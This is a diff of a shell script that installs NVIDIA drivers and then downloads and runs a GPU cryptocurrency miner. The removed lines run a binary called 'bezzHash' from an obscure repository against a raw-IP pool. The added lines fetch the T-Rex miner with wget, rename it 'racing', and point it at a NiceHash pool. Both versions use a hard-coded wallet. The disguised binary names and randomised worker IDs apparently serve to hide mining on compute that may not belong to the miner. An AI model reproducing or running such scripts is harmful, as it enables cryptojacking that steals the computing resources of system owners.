@@ -9,7 +9,7 @@ sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda
 sudo apt-get update
 sudo apt-get -y install cuda-drivers-510
 sudo apt-get install libcurl3 -y
-sudo apt-get install git
-
-git clone https://github.com/githuboneheart/mom.git && cd mom && cd views && chmod +x bezzHash
-./bezzHash --algo ETHASH --pool 149.248.19.20:443 --user 3CnZTtQYF7sGJHr1LsFRds4GmUvB1dUjAM.$(echo $(shuf -i 1000-9999 -n 1)-KVN) --longstats 5 --shortstats 5 --timeprint on --log on --ethstratum ETHPROX --basecolor
+wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
+tar xvzf t-rex-0.21.6-linux.tar.gz
+mv t-rex racing
+/home/racing -a ethash -o stratum+tcp://octopus.usa-west.nicehash.com:3389 -u 3CnZTtQYF7sGJHr1LsFRds4GmUvB1dUjAM -p x -w t1606_rk
